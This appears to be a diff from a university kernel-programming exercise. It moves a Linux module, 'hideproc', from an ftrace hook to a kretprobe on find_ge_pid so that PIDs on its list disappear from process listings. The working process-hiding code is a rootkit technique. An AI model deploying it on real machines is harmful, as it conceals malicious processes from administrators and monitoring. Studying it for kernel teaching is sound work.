@@ -9,84 +9,7 @@
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("National Cheng Kung University, Taiwan");
 
-static unsigned long lookup_name(const char *name)
-{
-	struct kprobe kp = {
-		.symbol_name = name
-	};
-	unsigned long retval;
-
-	if (register_kprobe(&kp) < 0) 
-        return 0;
-	retval = (unsigned long) kp.addr;
-	unregister_kprobe(&kp);
-	return retval;
-}   
-
 enum RETURN_CODE { SUCCESS };
-
-struct ftrace_hook {
-    const char *name;
-    void *func, *orig;
-    unsigned long address;
-    struct ftrace_ops ops;
-};
-
-static int hook_resolve_addr(struct ftrace_hook *hook)
-{
-    hook->address = lookup_name(hook->name);
-    if (!hook->address) {
-        printk("unresolved symbol: %s\n", hook->name);
-        return -ENOENT;
-    }
-    *((unsigned long *) hook->orig) = hook->address;
-    return 0;
-}
-
-static void notrace hook_ftrace_thunk(unsigned long ip,
-                                      unsigned long parent_ip,
-                                      struct ftrace_ops *ops,
-                                      struct pt_regs *regs)
-{
-    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);
-    if (!within_module(parent_ip, THIS_MODULE))
-        regs->ip = (unsigned long) hook->func;
-}
-
-static int hook_install(struct ftrace_hook *hook)
-{
-    int err = hook_resolve_addr(hook);
-    if (err)
-        return err;
-
-    hook->ops.func = hook_ftrace_thunk;
-    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_RECURSION_SAFE |
-                      FTRACE_OPS_FL_IPMODIFY;
-
-    err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
-    if (err) {
-        printk("ftrace_set_filter_ip() failed: %d\n", err);
-        return err;
-    }
-
-    err = register_ftrace_function(&hook->ops);
-    if (err) {
-        printk("register_ftrace_function() failed: %d\n", err);
-        ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
-        return err;
-    }
-    return 0;
-}
-
-void hook_remove(struct ftrace_hook *hook)
-{
-    int err = unregister_ftrace_function(&hook->ops);
-    if (err)
-        printk("unregister_ftrace_function() failed: %d\n", err);
-    err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
-    if (err)
-        printk("ftrace_set_filter_ip() failed: %d\n", err);
-}
 
 typedef struct {
     pid_t id;
@@ -94,11 +17,6 @@ typedef struct {
 } pid_node_t;
 
 LIST_HEAD(hidden_proc);
-
-typedef struct pid *(*find_ge_pid_func)(int nr, struct pid_namespace *ns);
-static find_ge_pid_func real_find_ge_pid;
-
-static struct ftrace_hook hook;
 
 static bool is_hidden_proc(pid_t pid)
 {
@@ -108,23 +26,6 @@ static bool is_hidden_proc(pid_t pid)
             return true;
     }
     return false;
-}
-
-static struct pid *hook_find_ge_pid(int nr, struct pid_namespace *ns)
-{
-    struct pid *pid = real_find_ge_pid(nr, ns);
-    while (pid && is_hidden_proc(pid->numbers->nr))
-        pid = real_find_ge_pid(pid->numbers->nr + 1, ns);
-    return pid;
-}
-
-static void init_hook(void)
-{
-    real_find_ge_pid = (find_ge_pid_func) lookup_name("find_ge_pid");
-    hook.name = "find_ge_pid";
-    hook.func = hook_find_ge_pid;
-    hook.orig = &real_find_ge_pid;
-    hook_install(&hook);
 }
 
 static int hide_process(pid_t pid)
@@ -143,6 +44,25 @@ static int unhide_process(pid_t pid)
         kfree(proc);
     }
     return SUCCESS;
+}
+
+static int entry_handler(struct kretprobe_instance *ri, struct pt_regs *regs)
+{
+    if (!current->mm)
+        return 1;	/* Skip kernel threads */
+
+    return 0;
+}
+
+static int ret_handler(struct kretprobe_instance *ri, struct pt_regs *regs)
+{
+    struct pid *pid = (struct pid *)regs_return_value(regs);
+    if (pid && is_hidden_proc(pid->numbers->nr))
+    {	
+        regs->ax = (unsigned long)0;
+    }	
+
+    return 0;
 }
 
 #define OUTPUT_BUFFER_FORMAT "pid: %d\n"
@@ -221,14 +141,33 @@ static const struct file_operations fops = {
     .write = device_write,
 };
 
+static struct kretprobe hide_kretprobe = {
+    .handler            = ret_handler,
+    .entry_handler      = entry_handler,
+    .maxactive	        = 20,
+    .kp.symbol_name     = "find_ge_pid",
+};
+
 #define MINOR_VERSION 1
 #define DEVICE_NAME "hideproc"
 
 static int _hideproc_init(void)
 {
     int err;
+
     printk(KERN_INFO "@ %s\n", __func__);
+    err = register_kretprobe(&hide_kretprobe);
+    if (err < 0) {
+        printk(KERN_INFO "register_kretprobe failed, returned %d\n",
+                err);
+        return -1;
+    }
     err = alloc_chrdev_region(&dev, MINOR_VERSION, 1, DEVICE_NAME);
+    if (err < 0) {
+        printk(KERN_INFO "alloc_chrdev_region failed, returned %d\n",
+                err);
+        return -1;
+    }
     dev_major = MAJOR(dev);
 
     hideproc_class = class_create(THIS_MODULE, DEVICE_NAME);
@@ -236,9 +175,8 @@ static int _hideproc_init(void)
     cdev_init(&cdev, &fops);
     cdev_add(&cdev, MKDEV(dev_major, MINOR_VERSION), 1);
     device_create(hideproc_class, NULL, MKDEV(dev_major, MINOR_VERSION), NULL,
-                  DEVICE_NAME);
+                    DEVICE_NAME);
 
-    init_hook();
 
     return 0;
 }
@@ -256,8 +194,7 @@ static void _hideproc_exit(void)
     device_destroy(hideproc_class, MKDEV(dev_major, MINOR_VERSION));
     class_destroy(hideproc_class);
     cdev_del(&cdev);
-
-    hook_remove(&hook);
+    unregister_kretprobe(&hide_kretprobe);
 }
 
 module_init(_hideproc_init);
